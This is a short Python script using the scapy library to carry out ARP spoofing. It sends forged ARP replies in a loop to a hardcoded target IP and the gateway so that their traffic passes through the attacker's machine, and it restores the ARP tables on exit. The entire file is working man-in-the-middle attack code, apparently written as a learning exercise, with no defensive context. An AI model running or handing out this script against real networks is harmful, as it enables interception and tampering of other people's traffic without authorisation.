#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac_address(ip_address):
    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]
    if len(answered_list) > 0:
        return answered_list[0][1].hwsrc


def restore(destination_ip, source_ip):
    destination_mac = get_mac_address(destination_ip)
    source_mac = get_mac_address(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    scapy.send(packet, verbose=False)


def spoof(target_ip, spoof_ip):
    target_mac_address = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac_address, psrc=spoof_ip)

    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.1.188"
gateway_ip = "192.168.1.1"
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " +
              str(sent_packets_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C... Resetting ARP tables")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
